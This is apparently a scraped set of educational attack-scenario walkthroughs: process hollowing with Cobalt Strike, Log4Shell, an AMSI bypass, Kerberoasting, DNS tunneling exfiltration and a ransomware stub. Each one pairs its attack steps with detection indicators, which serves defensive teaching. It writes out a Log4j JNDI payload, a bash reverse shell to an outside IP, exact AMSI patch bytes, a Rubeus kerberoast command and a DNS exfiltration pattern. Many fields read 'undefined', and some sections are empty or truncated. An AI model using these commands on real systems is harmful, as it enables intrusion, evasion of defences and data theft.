## 1. Process Hollowing & Cobalt Strike Beacon Loader
- **Scenario ID:** `process-hollowing`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/process-hollowing
- **Category:** Malware & Process Execution (`MALWARE`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-36884 (8.8 HIGH), CVE-2024-21412 (8.1 HIGH)
- **Attributed Threat Actors:** APT29 (Midnight Blizzard), TA551 (Shathak) & QakBot Affiliates
- **Executive Summary:** undefined
- **Kill-Chain Stages (5):**
  1. **[undefined] undefined** (undefined): Think of a stage director calling a famous, badge-carrying security guard onto the stage, but pressing the "Freeze" button the millisecond the guard steps through the door, before the guard can take a single step or read their official script. The attacker’s initial loader (Invoice_Q4.exe, PID 3104, the stage-1 file executed on Victim Laptop WKS-04, 10.10.4.15) calls CreateProcessW to start a real Windows system program: C:\Windows\System32\svchost.exe (PID 4892, chosen because svchost.exe carries a valid Microsoft digital signature, so security tools and analysts naturally expect to see it running in the background). However, the loader passes the creation flag CREATE_SUSPENDED = 0x00000004 (which tells the Windows kernel to build the process container in RAM and create its primary thread TID 4896, but freeze it at the starting line before its first instruction can execute). In response, the Windows kernel returns a populated PROCESS_INFORMATION structure containing process handle hProcess = 0x01C4 and thread handle hThread = 0x01C8 (handing Invoice_Q4.exe the master keys needed to inspect, empty, and rewrite svchost.exe’s memory in the next steps). When CreateProcessW is invoked with CREATE_SUSPENDED (0x00000004), ntdll!NtCreateUserProcess allocates the kernel process object (EPROCESS for PID 4892), maps ntdll.dll and the signed svchost.exe binary at base address 0x00400000, and parks the primary thread (TID 4896) at ntdll!RtlUserThreadStart with SuspendCount = 1 (keeping the child process completely inert in RAM while the parent dropper holds full PROCESS_ALL_ACCESS = 0x1FFFFF rights via handle hProcess = 0x01C4). On the diagram, follow Step #1 / Link #1 (#1→ CREATE_SUSPENDED / ⇠#1 ACK PID 4892) from Node ① (#1 Attacker Phishing & C2 Server) to Node ② (#2 Edge Firewall & Mail GW), monitored by Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor).
  2. **[undefined] undefined** (undefined): While the official armored truck is still frozen in the garage, the crew opens the back doors and removes every single crate of genuine bank cargo, leaving a completely hollow shell that still carries the official license plate on the outside. Now that svchost.exe (PID 4892, still frozen in memory so it cannot defend itself) is waiting, Invoice_Q4.exe (PID 3104) uses handle hProcess = 0x01C4 (received in Step #1) to read the child’s Process Environment Block (PEB, Windows’ internal process data table, queried at offset PEB+0x10 so the loader can find the exact memory address where svchost.exe was loaded: ImageBaseAddress = 0x00400000). The loader then calls ntdll!NtUnmapViewOfSection(hProcess = 0x01C4, BaseAddr = 0x00400000) (an undocumented native syscall that strips the original Microsoft svchost.exe code completely out of RAM), and the kernel replies with NTSTATUS = 0x00000000 (STATUS_SUCCESS, confirming that the 0x00400000 address slot inside PID 4892 is now completely empty and ready for the attacker’s payload). When NtUnmapViewOfSection executes in the kernel (nt!MiUnmapViewOfSection), the Windows Virtual Memory Manager detaches the file-backed SEC_IMAGE Virtual Address Descriptor (VAD) node mapped to C:\Windows\System32\svchost.exe at 0x00400000 and returns STATUS_SUCCESS = 0x00000000 (freeing the exact 0x00400000 base address so the replacement malware image can be loaded there in Step #3 without needing complex pointer relocations, while PID 4892 still retains its Microsoft-signed process identity). On the diagram, follow Step #2 / Link #2 (#2→ NtUnmapView / ⇠#2 RET 0x00400000) from Node ② (#2 Edge Firewall & Mail GW) to Node ③ (#3 Victim Laptop (WKS-04)), monitored by Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor).
  3. **[undefined] undefined** (undefined): Into that emptied-out armored truck, the intruder loads their own hidden gear and rewrites the route manual inside the cab, keeping the exterior paint job untouched so nobody outside notices the swap. Into that newly vacated base address (0x00400000, reusing the original base address freed in Step #2 so internal code pointers inside the malware do not break), Invoice_Q4.exe (PID 3104) uses handle hProcess = 0x01C4 (with GrantedAccess = 0x1FFFFF, granting full read, write, and allocation rights) to call VirtualAllocEx and reserve 264 KB (270,336 bytes) of private memory with PAGE_EXECUTE_READWRITE = 0x40 permissions (allowing the memory region to be both written to right now and executed as CPU instructions a moment later). It then calls WriteProcessMemory to stream the unpacked Cobalt Strike Beacon PE headers ("MZ" / 4D 5A, the Windows executable signature) and sections (.text.rdata.data) directly into svchost.exe’s RAM, receiving back lpNumberOfBytesWritten = 270,336 (confirming the entire payload and its entry point at 0x004014A0 are now mapped in memory without ever touching the hard drive). Across NtAllocateVirtualMemory and NtWriteVirtualMemory, the kernel creates an unbacked private memory region (MEM_PRIVATE with PAGE_EXECUTE_READWRITE = 0x40 at 0x00400000, whereas a legitimate binary loaded from disk uses file-backed SEC_IMAGE pages that strictly separate Read-Execute .text = 0x20 from Read-Write .data = 0x04). Committing 270,336 bytes containing an "MZ" PE header into unbacked RWX memory inside svchost.exe (PID 4892) is a primary forensic indicator of process hollowing. On the diagram, follow Step #3 / Link #3 (#3→ RWX WRITE / ⇠#3 ACK 264 KB) from Node ③ (#3 Victim Laptop (WKS-04)) to Node ④ (#4 Invoice_Q4.exe → svchost.exe), monitored by Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor).
  4. **[undefined] undefined** (undefined): Before pressing "Unfreeze", the intruder turns the driver’s steering wheel and GPS toward their own secret destination (RCX = 0x004014A0). The moment the freeze button is released, the truck drives straight toward the attacker’s objective. Even though the Cobalt Strike Beacon is now sitting inside svchost.exe (PID 4892 at 0x00400000), the frozen primary thread (TID 4896, accessed via handle hThread = 0x01C8 from Step #1) is still pointing at the old Microsoft startup address. To redirect it, Invoice_Q4.exe (PID 3104) calls SetThreadContext(hThread = 0x01C8) to overwrite the thread’s RCX register with 0x004014A0 (Base 0x00400000 + EntryPoint RVA 0x14A0, on 64-bit Windows, a newly created suspended thread holds its upcoming program entry-point address inside RCX, so updating RCX aims the thread straight at the injected Beacon without needing CreateRemoteThread). Finally, it calls ResumeThread(hThread = 0x01C8), which decrements the thread’s suspend counter from 1 to 0 (returning PreviousSuspendCount = 1 and waking TID 4896 so svchost.exe immediately begins executing the Beacon). When NtSetContextThread and NtResumeThread complete in the kernel, Windows updates the thread’s saved trap frame (KTRAP_FRAME.Rcx = 0x004014A0) and releases TID 4896 from ntdll!RtlUserThreadStart into user-mode execution (allowing the original stage-1 loader Invoice_Q4.exe PID 3104 to exit while the Beacon runs inside svchost.exe PID 4892, which simultaneously fires kernel image-tampering callbacks because the active executable pages at 0x00400000 no longer match the signed svchost.exe file on disk). On the diagram, follow Step #4 / Link #4 (#4→ IMAGE TAMPERED / ⇠#4 ACK EID 25) from Node ④ (#4 Invoice_Q4.exe → svchost.exe) to Node ⑤ (#5 Corp DC01 & Internal Shares), monitored by Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor).
  5. **[undefined] undefined** (undefined): The disguised armored truck now drives right past the perimeter gate guard (the firewall) to make a drop-off at an outside warehouse. The guard lets it pass because the truck’s badge says svchost.exe, until the central security room checks the GPS log and realizes that specific truck was never scheduled to leave the building. Now running actively inside the skin of C:\Windows\System32\svchost.exe (PID 4892, so path-based endpoint firewall rules see a trusted Windows binary requesting network access), the Cobalt Strike Beacon loads winhttp.dll, opens an encrypted TLS 1.3 HTTPS connection over TCP port 443 (standard web traffic port chosen to blend in with normal employee browsing) to the external Command-and-Control server at 185.220.101.42:443, and sends an HTTP GET request for /jquery-3.3.1.min.js (a Malleable C2 profile that hides RSA-encrypted victim host metadata inside the HTTP Cookie header to mimic a harmless jQuery script fetch). The C2 server (185.220.101.42:443) replies with HTTP 200 OK (disguised as an application/javascript response carrying AES-encrypted operator tasking and a 60-second callback interval with 20% random jitter, spacing out future check-ins to evade simple fixed-timer beacon detectors). Application-based host firewalls often permit C:\Windows\System32\svchost.exe (trusted by path as a core Windows service host binary) to initiate outbound HTTPS connections through the perimeter NAT. However, a legitimate svchost.exe is always spawned by services.exe and always includes a "-k <ServiceGroup>" command-line flag (which Windows uses to group related system services under a shared host process), so a bare svchost.exe (PID 4892) spawned by Invoice_Q4.exe (PID 3104) negotiating TLS 1.3 with JA3 fingerprint 72a589da586844d7f0818ce684948eea (a known Cobalt Strike TLS ClientHello signature) and polling /jquery-3.3.1.min.js every 60s (±20% jitter) is immediately caught by SIEM correlation. On the diagram, follow Step #5 / Link #5 (#5→ C2 BEACON / ⇠#5 RESP 1.4 KB) from Node ⑤ (#5 Corp DC01 & Internal Shares) to Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor), monitored by Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor).
- **Primary Authoritative Sources (3):**
  - Microsoft Win32 API Reference — *CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory* (`MSDN-WIN32-MEMORY`): https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
  - Microsoft Sysinternals — *Sysmon Event ID 25: ProcessTampering (Image is replaced)* (`SYSMON-EID-25`): https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering
  - Elastic Security Labs — *Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence* (`ELASTIC-MEM-ETW`): https://www.elastic.co/security-labs

## 2. Log4Shell JNDI Injection to Reverse Shell (DFIR Log Trace)
- **Scenario ID:** `log4shell-dfir`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/log4shell-dfir
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2021-44228 (10.0 CRITICAL), CVE-2021-45046 (9.0 CRITICAL)
- **Attributed Threat Actors:** APT41 (Winnti / Barium), Lazarus Group (Aquatic Panda / MuddyWater)
- **Executive Summary:** undefined
- **Kill-Chain Stages (4):**
  1. **[undefined] undefined** (undefined): The intruder walks up to the front reception desk and hands over a visitor badge whose "X-Api-Version / User-Agent" field contains a secret phone-call instruction instead of a normal browser name. The attacker (91.214.124.88) sends an HTTPS GET request to /api/v1/login on the Nginx Reverse Proxy (10.20.1.10:443), placing an obfuscated Log4j lookup expression, ${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit} (using nested ${lower:...} tokens to evade basic WAF string filters while still resolving to a JNDI lookup), inside the HTTP User-Agent and X-Api-Version headers (chosen because web servers automatically write these headers into their access and failed-login audit logs). Nginx logs the request and returns HTTP 401 Unauthorized after forwarding it to the Spring Boot backend (10.20.1.15, PID 1420), which immediately passes the unauthenticated request’s User-Agent string into logger.info() (triggering the vulnerability even though the login attempt itself returned 401). Web applications routinely pass HTTP headers like User-Agent or X-Api-Version into logger.info("Failed login from UA: " + userAgent) (recording client metadata for security audit trails). Because Log4j2 v2.0 to 2.14.1 had message pattern lookups enabled by default (designed to resolve variables like ${java:version} inside log lines), logging the rejected HTTP 401 request causes JndiLookup.lookup() inside java (PID 1420) to parse and execute the embedded "${jndi:ldap://...}" expression. On the diagram, follow Step #1 / Link #1 (#1→ HTTP JNDI / ⇠#1 RESP HTTP 401) from Node ① (#1 Attacker Exploit & Scanner) to Node ② (#2 DMZ WAF & Reverse Proxy), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM).
  2. **[undefined] undefined** (undefined): As the receptionist writes the visitor’s header into the guestbook, they read the "${jndi:ldap://...}" instruction out loud, pick up the office telephone, and dial the intruder’s external directory number (91.214.124.88:1389) to ask what to do next. Instead of writing the string literally to disk, Log4j’s MessagePatternConverter inside the Java process (PID 1420 on app-prod-01, 10.20.1.15) hands the "${jndi:ldap://...}" expression to the Java Naming and Directory Interface (JNDI, Java’s built-in API for looking up shared enterprise objects over a network directory). JNDI opens an outbound TCP connection from 10.20.1.15:49210 to port 1389 on the attacker’s rogue Marshalsec LDAP server at 91.214.124.88:1389 and sends a 118-byte LDAP SearchRequest for baseObject "Exploit" (forcing the internal web server to reach out across the firewall and ask the attacker’s directory server how to construct the logged object). JNDI supports pluggable directory protocols including LDAP, RMI, and DNS. Because Log4j2 v2.14.1 placed no domain whitelist on JndiManager.lookup(), an attacker-supplied ldap://91.214.124.88:1389/Exploit URL forces javax.naming.InitialContext.lookup() inside PID 1420 to transmit the outbound LDAP SearchRequest (118 B) and accept the rogue server’s LDAP SearchResultEntry response containing external class-loading attributes. In the documented Suricata / Zeek exchange from DMZ WAF & Reverse Proxy to Java App Server (app-prod-01), Java App Server (app-prod-01) responds with ALERT 118 B (confirming that the LDAP QUERY request succeeded on Java App Server (app-prod-01) and establishing the runtime state required for Step #3 LDAP REFERRAL & REMOTE CLASS LOADING). On the diagram, follow Step #2 / Link #2 (#2→ LDAP QUERY / ⇠#2 ALERT 118 B) from Node ② (#2 DMZ WAF & Reverse Proxy) to Node ③ (#3 Java App Server (app-prod-01)), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM).
  3. **[undefined] undefined** (undefined): The voice on the other end of the phone says: "I don’t keep the package here, go download the blueprint from my web locker on port 8888 (javaCodeBase)." The Java server obediently fetches that blueprint and loads it directly into memory. The attacker’s LDAP server (91.214.124.88:1389) replies with a JNDI Naming Reference containing javaCodeBase="http://91.214.124.88:8888/" and javaFactory="Exploit" (directory attributes that tell the Java server that the requested object class is hosted at an external HTTP URL). Obeying those attributes, the JVM (PID 1420 on 10.20.1.15) sends an HTTP GET /Exploit.class request to 91.214.124.88:8888 and receives an HTTP 200 OK response delivering 1.8 KB (1,842 bytes) of compiled Java bytecode (application/java-vm with magic header 0xCAFEBABE, which URLClassLoader.findClass("Exploit") maps directly into JVM memory). When an LDAP SearchResultEntry includes javaClassName, javaCodeBase, and javaFactory, Java’s NamingManager.getObjectInstance() automatically spawns a URLClassLoader pointing to http://91.214.124.88:8888/Exploit.class (allowing the attacker to stream a 1.8 KB compiled Java class over standard HTTP and instantiate it inside PID 1420). On the diagram, follow Step #3 / Link #3 (#3→ Exploit.class / ⇠#3 RESP 1.8 KB) from Node ③ (#3 Java App Server (app-prod-01)) to Node ① (#1 Attacker Exploit & Scanner), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM).
  4. **[undefined] undefined** (undefined): The moment the blueprint finishes loading on the receptionist’s desk, a spring-loaded mechanism inside its cover (static {} block) snaps open and dials a permanent private backdoor phone line (/bin/sh) straight back to the intruder on port 4444. The instant the JVM (java, PID 1420) initializes Exploit.class in memory, the class’s static {} initializer block invokes Runtime.getRuntime().exec() (Java’s native OS command runner). This causes /usr/bin/java (PID 1420, running as service account tomcat, uid=1001) to execute the Linux kernel execve syscall and spawn /bin/sh (PID 8912, PPID 1420) with command line: /bin/sh -c "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1" (redirecting standard input, output, and error over a live TCP socket to 91.214.124.88:4444 so the attacker receives an interactive shell under the tomcat service user). By placing the payload inside the class’s static {} block or no-argument constructor, the attacker guarantees that OS commands execute under the tomcat service account (uid=1001) during Class.forName() initialization (where the kernel returns child PID 8912 and duplicates the socket file descriptors via dup2 before Log4j even finishes formatting the log line). On the diagram, follow Step #4 / Link #4 (#4→ SPAWN /BIN/SH / ⇠#4 ACK PID 8912) from Node ③ (#3 Java App Server (app-prod-01)) to Node ④ (#4 Java Log4j2 → /bin/bash Shell), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM).
- **Primary Authoritative Sources (3):**
  - NIST NVD & Apache Software Foundation — *CVE-2021-44228 Apache Log4j2 JNDI Lookup Advisory* (`CVE-2021-44228`): https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - CISA Emergency Directive — *Apache Log4j Vulnerability Guidance & Detection Signatures* (`CISA-ED-22-02`): https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance
  - Swiss NCSC / GOVCERT.ch Technical Analysis — *Zero-Day Exploit Targeting Popular Java Library Log4j (JNDI Class-Loading Anatomy)* (`GOVCERT-LOG4SHELL-2021`): https://www.ncsc.admin.ch/ncsc/en/home/aktuell/im-fokus/log4j.html

## 3. Fileless AMSI Memory Bypass & Reflective DLL Injection
- **Scenario ID:** `amsi-reflective-dll`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/amsi-reflective-dll
- **Category:** Malware & Process Execution (`MALWARE`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-23397 (9.8 CRITICAL), CVE-2024-21351 (7.6 HIGH)
- **Attributed Threat Actors:** APT28 (Fancy Bear / Forest Blizzard), FIN7 (Carbanak / Sangria Tempest)
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): The intruder locates the exact inspection box (amsi.dll) mounted inside their room and unlocks its metal protective cover (changing memory protection from Read-Execute to Read-Write-Execute) so the internal wiring can be altered. Every PowerShell process automatically loads C:\Windows\System32\amsi.dll (the Windows Antimalware Scan Interface library that inspects scripts before they run) into its own user-mode memory space. Running inside powershell.exe (PID 6120, launched with -NoP -NonI -W Hidden -Exec Bypass under CORP\admin_clark), the attacker uses .NET P/Invoke to call LoadLibrary("amsi.dll") and GetProcAddress("AmsiScanBuffer"), receiving the function’s in-memory export address 0x7FF91A042480 (which pinpoints the exact byte offset where AMSI starts inspecting scripts), and prepares VirtualProtect to flip that page from PAGE_EXECUTE_READ (0x20) to PAGE_EXECUTE_READWRITE (0x40). Because amsi.dll operates in user mode (Ring 3, sharing the same virtual address space and permissions as powershell.exe PID 6120 rather than being isolated in the Windows kernel), any code running inside PowerShell can resolve amsi.dll!AmsiScanBuffer at 0x7FF91A042480 via P/Invoke (though executing this first stager script triggers a Warning-level PowerShell Operational Event ID 4104 ScriptBlock log before the patch is written). On the diagram, follow Step #1 / Link #1 (#1→ SCRIPTBLOCK / ⇠#1 ACK Warning) from Node ③ (#3 Admin Laptop Host (DEV-WKS-09)) to Node ④ (#4 powershell.exe (AMSI Patch + DLL)), monitored by Node ⑥ (#6 PowerShell EID 4104 & EDR Scanner).
  2. **[undefined] undefined** (undefined): With the inspection cover open, the intruder replaces the scanner’s sensor circuit with a 6-byte shortcut that immediately stamps "E_INVALIDARG / CLEAN" and exits before the camera even turns on. After calling VirtualProtect(0x7FF91A042480, 6, 0x40) (which unlocks the code page and returns the previous protection 0x20), powershell.exe (PID 6120) uses [System.Runtime.InteropServices.Marshal]::Copy to overwrite the first 6 bytes of AmsiScanBuffer (4C 8B DC 49 89 5B) with B8 57 00 07 80 C3 (which disassembles to "mov eax, 0x80070057; ret", instructing the CPU to immediately return error code E_INVALIDARG and exit the function). From this instant on, whenever PowerShell hands a script or assembly buffer to AMSI, AmsiScanBuffer returns E_INVALIDARG at byte 0 (which PowerShell treats as a non-detection, allowing subsequent payloads to run uninspected). AmsiScanBuffer normally validates its arguments and passes the script buffer to the registered antivirus provider. Overwriting its 6-byte prologue at 0x7FF91A042480 in RAM triggers a Copy-on-Write page split in PID 6120’s Virtual Address Descriptor (VAD) tree (converting the shared signed amsi.dll .text page into a private modified page that Kernel ETW TiProtectVM and EDR integrity scanners flag). On the diagram, follow Step #2 / Link #2 (#2→ PATCH 6 BYTES / ⇠#2 RET 6 Bytes) from Node ③ (#3 Admin Laptop Host (DEV-WKS-09)) to Node ② (#2 Perimeter NGFW & Proxy), monitored by Node ⑥ (#6 PowerShell EID 4104 & EDR Scanner).
  3. **[undefined] undefined** (undefined): Now that the room’s X-ray scanner is blind, the intruder unfolds a complete communication radio directly out of a memorized blueprint in their head ([Reflection.Assembly]::Load), never placing a single file onto the floor where a floor sensor could spot it. With AMSI blinded inside PID 6120 (because normally calling Assembly::Load in .NET 4.8+ triggers an automatic AmsiScanBuffer check on the byte array, which would have caught the unencrypted DLL if Step 2 had not patched it first), the attacker decodes the stage-2 payload in RAM and invokes [System.Reflection.Assembly]::Load([byte[]]$dllBytes). The reflective loader allocates a 512 KB private RWX heap region at base address 0x024A80000 (mapping the MZ/PE headers, resolving imports, and invoking the agent entry point directly in memory without ever writing a .dll file to the hard drive or registering in the PEB Ldr module list). Reflective code loading parses the PE/COFF headers from a raw byte array and maps the 512 KB executable image into anonymous private heap memory (0x024A80000 with RWX protection, bypassing Sysmon Event ID 7 file-backed DLL load callbacks while leaving an unbacked MZ 4D 5A header in private RAM that PE-sieve and .NET Runtime ETW detect). On the diagram, follow Step #3 / Link #3 (#3→ REFLECTIVE DLL / ⇠#3 ALERT 512 KB) from Node ② (#2 Perimeter NGFW & Proxy) to Node ① (#1 HTTPS Payload Stager & C2), monitored by Node ⑥ (#6 PowerShell EID 4104 & EDR Scanner).
- **Primary Authoritative Sources (3):**
  - Microsoft Learn — *Antimalware Scan Interface (AMSI) Developer Architecture* (`MS-AMSI-ARCH`): https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
  - Microsoft PowerShell Team — *PowerShell Operational Log Event ID 4104 (Script Block Logging)* (`MS-PS-EID-4104`): https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows
  - The MITRE Corporation & Defender Threat Intelligence — *MITRE ATT&CK T1620 & T1562.001: Reflective Code Loading & AMSI Memory Patching* (`ATT&CK-T1620-T1562`): https://attack.mitre.org/techniques/T1620/

## 4. Active Directory Kerberoasting & Pass-the-Hash Lateral Movement
- **Scenario ID:** `ad-kerberoasting`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/ad-kerberoasting
- **Category:** Active Directory & Identity (`ACTIVE_DIRECTORY`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2022-33679 (9.8 CRITICAL), CVE-2021-42287 / CVE-2021-42278 (8.8 HIGH)
- **Attributed Threat Actors:** Volt Typhoon & Scattered Spider (UNC3944), Wizard Spider (Conti / Ryuk / BlackBasta)
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): The visitor opens the park’s public phonebook (LDAP), finds the SQL attraction run by a human manager (svc_mssql), and asks the central ticket booth (DC01.corp.local:88) for a voucher sealed with an older, fast-to-crack wax stamp (0x17 RC4-HMAC) instead of modern armor (AES-256). From the compromised workstation WS-FINANCE-04 (10.10.20.45) using standard domain account CORP\m.davis, the attacker runs Rubeus.exe (PID 3920, PPID 2104: Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /nowrap). After querying LDAP (TCP/389) on DC01.corp.local (10.10.1.5) via ldap_search_ext_s("(servicePrincipalName=*)") to locate MSSQLSvc/sql01.corp.local:1433, Rubeus sends a Kerberos TGS-REQ (TCP/88) with TicketOptions = 0x40810000 requesting encryption type 0x17 (RC4-HMAC, a legacy cipher that encrypts the ticket directly with svc_mssql’s NTLM password hash, making it thousands of times faster to brute-force offline than AES-256 / 0x12). By design in the Kerberos protocol, the Key Distribution Center (KDC) on DC01.corp.local (10.10.1.5) does not check whether CORP\m.davis has permission to log into SQL01; it immediately encrypts the KRB_TGS_REP service ticket using svc_mssql’s NTLM hash and returns the RC4 ciphertext to Rubeus.exe (PID 3920) on 10.10.20.45 (while logging Windows Security Event ID 4769 with Status = 0x0 and TicketEncryptionType = 0x17). On the diagram, follow Step #1 / Link #1 (#1→ TGS RC4 (0x17) / ⇠#1 ACK Event 4769) from Node ① (#1 Foothold Session (CORP\m.davis)) to Node ② (#2 Core L3 VLAN Switch), monitored by Node ⑥ (#6 SIEM Log Collector (Splunk)).
  2. **[undefined] undefined** (undefined): Back in their private workshop, the attacker tests millions of candidate passwords per second against the sealed voucher ($krb5tgs$23$*) until the seal opens, and then walks straight up to the SQL Server’s administration door (SMB TCP/445) wearing the manager’s real badge (svc_mssql). The attacker exports the returned RC4 TGS ticket from WS-FINANCE-04 in $krb5tgs$23$* format and cracks it offline using Hashcat (-m 13100, generating zero failed-login alerts on DC01 because every guess runs locally on the attacker’s GPU). On the diagram, follow Step #2 / Link #2 (#2→ SMB LOGON (3) / ⇠#2 ACK Event 4624) from Node ② (#2 Core L3 VLAN Switch) to Node ⑤ (#5 DC01 (KDC) & SQL01.corp.local), monitored by Node ⑥ (#6 SIEM Log Collector (Splunk)).

On the diagram, follow Step #3 / Link #3 (#3→ NEW SERVICE / ⇠#3 ACK Event 7045) from Node ⑤ (#5 DC01 (KDC) & SQL01.corp.local) to Node ③ (#3 Finance Workstation (WS-FINANCE-04)), monitored by Node ⑥ (#6 SIEM Log Collector (Splunk)).

## 5. DNS Tunneling C2 & High-Entropy Subdomain Data Exfiltration
- **Scenario ID:** `dns-tunneling-exfil`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/dns-tunneling-exfil
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2024-21887 (9.1 CRITICAL), CVE-2023-4966 (9.4 CRITICAL)
- **Attributed Threat Actors:** OilRig (APT34 / Hazel Sandstorm), xHunt Campaign & DarkHydrus
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): Before speaking to the prison operator, the inmate shreds the stolen customer ledger (customers_pii.csv) into 48-byte strips and encodes every strip in hexadecimal letters and numbers so it looks like a valid subdomain lookup. On the isolated database host DB-BACKUP-02 (10.50.1.12, which has no direct internet access because the Egress Firewall blocks TCP ports 80 and 443), the implant C:\ProgramData\sync_agent.exe (PID 4412, running as CORP\svc_backup) calls ReadFile("customers_pii.csv"), slices each row into 48-byte chunks, hex-encodes the bytes (for example, turning "4102,john_smith,2065" into "343130322c6a6f686e5f736d6974682c32303635"), and calls DnsQuery_A(DNS_TYPE_TXT) to send a 112-byte UDP/53 DNS TXT query for 001.343130322c6a6f686e5f736d6974682c32303635.c2.badactor-dns.net to the Internal DNS Resolver (10.50.1.53:53). Standard DNS resolvers permit alphanumeric labels up to 63 characters per subdomain label. By hex-encoding 48-byte CSV chunks (producing a Shannon entropy of 4.48 bits/char compared to <3.2 for normal domain names) and querying the local corporate DNS resolver (10.50.1.53:53), sync_agent.exe (PID 4412) receives QueryStatus = 0 with QueryResults = "type: 16 ACK:001:NEXT;" (confirming chunk #001 was delivered and acknowledged so the loop can advance to chunk #002 after Sleep(150), while Sysmon Event ID 22 logs the query on the host). On the diagram, follow Step #1 / Link #1 (#1→ DNS TXT EXFIL / ⇠#1 ACK 112 B) from Node ③ (#3 Isolated Backup Host (DB-BACKUP-02)) to Node ④ (#4 sync_agent.exe (DNS Exfil Agent)), monitored by Node ⑥ (#6 Zeek DNS NDR & Sysmon EID 22).
  2. **[undefined] undefined** (undefined): The trusted internal prison operator (Internal DNS Resolver 10.50.1.53) checks their local binder, sees a 100% cache miss because every subdomain is a brand-new chunk of stolen data, and automatically calls the outside internet (45.133.1.99:53) to resolve it. Because every single query from DB-BACKUP-02 contains a unique hex-encoded chunk of stolen data in the subdomain label (guaranteeing a 100% DNS cache miss rate so the resolver can never answer from local cache), the Internal DNS Resolver (10.50.1.53) follows standard recursive DNS resolution and forwards the 164-byte UDP/53 TXT query across the Egress Firewall directly to the authoritative Name Server for badactor-dns.net (ns1.badactor-dns.net at 45.133.1.99:53). While the Egress Firewall blocks direct outbound connections from DB-BACKUP-02 (10.50.1.12), it permits outbound UDP/53 recursive queries originating from the corporate DNS server (10.50.1.53, which receives back the authoritative TXT answer "ACK:001:NEXT" with TTL = 0.000000 and records the 164-byte exchange in Zeek dns.log). On the diagram, follow Step #2 / Link #2 (#2→ RECURSIVE TXT / ⇠#2 RESP 164 B) from Node ④ (#4 sync_agent.exe (DNS Exfil Agent)) to Node ② (#2 Corp DNS Resolver & FW), monitored by Node ⑥ (#6 Zeek DNS NDR & Sysmon EID 22).
  3. **[undefined] undefined** (undefined): The accomplice sitting at the ns1.badactor-dns.net desk strips the hex code off every incoming question to rebuild customers_pii.csv, and replies with a DNS TXT answer (ACK:001:CMD:SLEEP_60) that rides all the way back to the implant. When the recursive query arrives at the attacker’s authoritative Name Server (ns1.badactor-dns.net, 45.133.1.99:53), the dnscat2/exfil daemon strips the .c2.badactor-dns.net suffix, hex-decodes chunk #001 back into plaintext CSV rows (customers_pii.csv), and sends back a 188-byte DNS TXT response (TXT "ACK:001:CMD:SLEEP_60" with TTL = 0 seconds so the corporate DNS server will not cache the answer). The Internal DNS Resolver (10.50.1.53) relays that 188-byte TXT answer right back to sync_agent.exe (PID 4412) on DB-BACKUP-02 (10.50.1.12). This completes a bidirectional covert channel over UDP/53: outbound data exfiltration rides inside the DNS query subdomain labels (QNAME), while inbound acknowledgments and C2 tasking (the 188-byte TXT "ACK:001:CMD:SLEEP_60" response with rcode = 0 NOERROR and TTL = 0) ride back inside the DNS TXT answer record to pace the implant’s exfiltration loop. On the diagram, follow Step #3 / Link #3 (#3→ TXT C2 ACK & CMD / ⇠#3 RESP 188 B) from Node ② (#2 Corp DNS Resolver & FW) to Node ① (#1 Attacker Authoritative DNS C2), monitored by Node ⑥ (#6 Zeek DNS NDR & Sysmon EID 22).

## 6. LockBit Ransomware Behavioral Analysis: VSS Wipe & Fast Encryption
- **Scenario ID:** `ransomware-shadow-wipe`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/ransomware-shadow-wipe
- **Category:** Malware & Process Execution (`MALWARE`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2023-4966 & CVE-2024-1709 (10.0 CRITICAL), CVE-2021-36934 (7.8 HIGH)
- **Attributed Threat Actors:** LockBit 3.0 (Bitwise Spider), ALPHV / BlackCat & Akira Affiliates
- **Executive Summary:** undefined
- **Kill-Chain Stages (2):**
